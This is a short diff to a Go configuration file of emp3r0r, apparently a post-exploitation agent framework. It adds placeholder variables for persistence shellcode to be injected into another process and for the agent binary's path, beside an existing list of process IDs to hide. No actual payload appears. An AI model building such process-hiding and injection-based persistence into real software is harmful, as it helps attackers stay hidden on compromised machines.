@@ -36,9 +36,18 @@ var (
 
 	// HIDE_PIDS all the processeserr from emp3r0r
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
+
+	// GuardianShellcode inject into a process to gain persistence
+	GuardianShellcode = `[persistence_shellcode]`
+
+	// GuardianAgentPath where the agent binary is stored
+	GuardianAgentPath = "[persistence_agent_path]"
 )
 
 const (
+	// Version record version on build time
+	Version = "[emp3r0r_version_string]"
+
 	// AgentRoot root directory of emp3r0r
 	AgentRoot = "[agent_root]"
 
